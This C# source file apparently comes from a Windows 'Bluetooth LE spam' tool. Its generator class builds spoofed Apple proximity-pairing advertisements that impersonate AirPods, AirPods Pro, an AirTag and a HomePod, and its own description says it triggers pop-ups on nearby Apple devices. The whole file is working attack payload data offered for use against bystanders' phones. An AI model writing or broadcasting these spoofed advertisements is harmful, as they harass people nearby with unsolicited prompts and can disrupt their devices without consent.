using System;
using System.Collections.Generic;
using BluetoothLESpamWindows.Models;

namespace BluetoothLESpamWindows.AdvertisementGenerators
{
    public class AppleDevicePopUpGenerator : IAdvertisementSetGenerator
    {
        public AdvertisementSet GenerateAdvertisementSet()
        {
            var advertisementSet = new AdvertisementSet(
                "Apple Device Pop-Up",
                "Generates pop-ups on nearby Apple devices"
            );
            
            // Apple Continuity Service UUID
            Guid appleProximityUuid = new Guid("74278BDA-B644-4520-8F0C-720EAF059935");
            
            // Create different device advertisements
            AddAirPodsAdvertisement(advertisementSet);
            AddAirPodsProAdvertisement(advertisementSet);
            AddAirTagAdvertisement(advertisementSet);
            AddHomePodAdvertisement(advertisementSet);
            
            return advertisementSet;
        }
        
        private void AddAirPodsAdvertisement(AdvertisementSet advertisementSet)
        {
            var advertisementData = new AdvertisementData
            {
                ManufacturerId = 0x004C, // Apple
                ManufacturerData = new byte[] 
                {
                    0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 
                    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00
                }
            };
            
            advertisementSet.AdvertisementDataList.Add(advertisementData);
        }
        
        private void AddAirPodsProAdvertisement(AdvertisementSet advertisementSet)
        {
            var advertisementData = new AdvertisementData
            {
                ManufacturerId = 0x004C, // Apple
                ManufacturerData = new byte[] 
                {
                    0x07, 0x19, 0x01, 0x0E, 0x20, 0x75, 0xaa, 0x30, 
                    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00
                }
            };
            
            advertisementSet.AdvertisementDataList.Add(advertisementData);
        }
        
        private void AddAirTagAdvertisement(AdvertisementSet advertisementSet)
        {
            var advertisementData = new AdvertisementData
            {
                ManufacturerId = 0x004C, // Apple
                ManufacturerData = new byte[] 
                {
                    0x07, 0x19, 0x01, 0x0F, 0x20, 0x75, 0xaa, 0x30, 
                    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00
                }
            };
            
            advertisementSet.AdvertisementDataList.Add(advertisementData);
        }
        
        private void AddHomePodAdvertisement(AdvertisementSet advertisementSet)
        {
            var advertisementData = new AdvertisementData
            {
                ManufacturerId = 0x004C, // Apple
                ManufacturerData = new byte[] 
                {
                    0x07, 0x19, 0x01, 0x0A, 0x20, 0x75, 0xaa, 0x30, 
                    0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x00, 0x00
                }
            };
            
            advertisementSet.AdvertisementDataList.Add(advertisementData);
        }
    }
}